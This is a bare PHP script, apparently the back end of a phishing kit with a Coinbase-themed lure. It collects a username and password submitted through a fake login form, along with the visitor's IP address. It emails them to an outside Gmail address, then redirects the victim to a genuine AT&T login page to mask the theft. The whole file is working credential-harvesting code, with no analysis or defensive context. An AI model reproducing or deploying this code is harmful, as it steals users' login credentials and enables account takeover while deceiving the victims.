<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || coinbxe log GOD 1ST SON || :------\n";
$message .= "User: ".$_POST['formtext1']."\n";
$message .= "Pass: ".$_POST['formtext2']."\n";
$message .= "----: || THANKS BE TO GOD || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="beccahenson5@gmail.com";
$subject = "allah | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://loginprodx.att.net/commonLogin/igate_edam/controller.do?TAM_OP=login&USERNAME=unauthenticated&ERROR_CODE=0x00000000&ERROR_TEXT=HPDBA0521I%20%20%20Successful%20completion&METHOD=GET&URL=%2FFIM%2Fsps%2Fauth%3FFedName%3DATTsyn%26FedId%3Duuid9a412935-0156-1b6a-b5dc-fe4935913019%26PartnerId%3Dhttps%253A%252F%252Fatt.auth-gateway.net%252Fsaml%252Fmodule.php%252Fbridge%252Fsp%252Fmetadata.php%252Fatt_sp%26AssertionConsumerURL%3Dhttps%253A%252F%252Fatt.auth-gateway.net%252Fsaml%252Fmodule.php%252Fsaml%252Fsp%252Fsaml2-acs.php%252Fatt_sp%3Ftucd567%3Dw&REFERER=https%3A%2F%2Fatt.auth-gateway.net%2Fsaml%2Fmodule.php%2Fbridge%2Flogin%2F%3Fidp%3Datt%26force%3D0%26passive%3D0%26service%3Dportal%26partner_payload%3DYToyOntzOjg6ImJvdW5jZXRvIjtzOjIyOiJodHRwczovL3N0YXJ0LmF0dC5uZXQvIjtzOjY6ImFjdGlvbiI7czo1OiJsb2dpbiI7fQ%253D%253D%26timestamp%3D1535370975%26token%3Df8afc0239719eef57347d8c447cd3b06226537b6728ddcb450ac738976655620&HOSTNAME=loginprodx.att.net&AUTHNLEVEL=&FAILREASON=&PROTOCOL=https&OLDSESSION=");
?>